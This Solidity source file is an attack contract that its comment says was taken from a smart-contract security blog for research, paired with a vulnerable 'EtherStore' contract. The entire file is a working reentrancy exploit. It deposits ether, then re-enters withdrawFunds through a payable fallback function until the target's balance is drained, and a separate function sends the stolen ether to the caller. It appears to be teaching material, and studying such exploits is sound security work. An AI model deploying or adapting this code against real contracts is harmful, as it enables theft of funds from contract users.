pragma solidity ^0.4.25;
import "EtherStore.sol";

// Attack contract pulled from sigp/solidity-security-blog GitHub
// for research purposes.  Works with EtherStore.sol.
// https://github.com/sigp/solidity-security-blog.git

contract Attack {
  EtherStore public etherStore;

  // initialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
